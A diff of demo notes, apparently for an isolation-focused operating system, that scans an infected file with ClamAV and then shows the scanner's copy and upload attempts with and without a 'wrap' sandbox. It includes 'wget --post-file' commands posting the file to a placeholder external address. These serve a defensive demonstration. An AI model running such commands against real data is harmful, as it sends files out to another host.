@@ -1,5 +1,6 @@
+** before doing the demo, set TERM=xterm in the cygwin terminal window **
+
 on nickolai's laptop:
-    net start inetd
     dhcpd -d eth1/eth0
 
 bootstrap:
@@ -7,9 +8,9 @@ bootstrap:
     ...
     rm /bin/ssh.tar
 
-ssh -T root@10.0.0.2
+ssh root@10.0.0.2
 
-jshell -> reboot
+reboot
 
 jshell:
     cd /self
@@ -21,13 +22,12 @@ clamscan/clamwrap
     /bin/clamscan -d /bin/clamav_main.cvd /bin
     wrap /bin/clamscan -d /bin/clamav_main.cvd /bin
 
-    mkdir /stash
-    /bin/cp /bin/infected.file /stash/copy1
-    wrap /bin/cp /bin/infected.file /stash/copy2
+    /bin/cp /bin/infected.file /stash
+    wrap /bin/cp /bin/infected.file /stash2
+    wrap /bin/cp /bin/infected.file /tmp
 
-    /bin/wget http://10.0.0.1/ --post-file=/bin/infected.file -O /dev/null
-    [[ BUG -- see below ]]
-    wrap /bin/wget http://10.0.0.1/ --post-file=/bin/infected.file -O /dev/null
+    /bin/wget http://1.2.3.4/ --post-file=/bin/infected.file -O /dev/null
+    wrap /bin/wget http://1.2.3.4/ --post-file=/bin/infected.file -O /dev/null
 
 authd: adduser, login, ...
     show /uauth, structure of user auth daemon?
@@ -35,6 +35,7 @@ authd: adduser, login, ...
 gcc
     tar -xf /bin/gcc.tar.gz
     echo 'int main() { printf("Hello world.\\n"); }' > hello.c
+    [ or use vim, but it's sluggish ]
     gcc hello.c -o hello
     ./hello
 
